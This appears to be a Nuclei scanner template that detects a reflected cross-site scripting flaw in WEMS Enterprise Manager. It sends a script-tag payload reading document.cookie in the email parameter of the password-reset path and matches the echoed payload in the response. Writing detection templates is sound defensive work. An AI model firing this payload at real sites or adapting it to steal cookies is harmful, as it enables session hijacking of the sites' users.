id: WEMS XSS

info:
  name: WEMS Enterprise Manager XSS
  author: pikpikcu
  severity: medium

requests:
  - method: GET
    path:
      - '{{BaseURL}}/guest/users/forgotten?email="><script>confirm(document.cookie)</script>'
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - '"><script>confirm(document.cookie)</script>'
        part: body
